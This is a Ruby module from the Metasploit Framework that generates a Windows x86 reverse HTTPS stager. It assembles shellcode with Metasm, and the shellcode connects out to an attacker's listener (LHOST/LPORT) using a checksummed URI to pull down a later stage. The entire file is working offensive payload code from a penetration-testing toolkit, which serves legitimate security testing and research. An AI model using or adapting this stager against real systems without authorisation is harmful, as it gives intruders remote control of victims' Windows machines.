# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/reverse_http'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS
#
###


module Payload::Windows::ReverseHttps

  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate and compile the stager
  #
  def generate_reverse_https(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_http(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_https(
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW),
        ssl:  true)
    end

    # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
    uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
    uri = generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_https(conf)
  end

  # TODO: Use the CachedSize instead (PR #4894)
  def cached_size
    341
  end

end

end
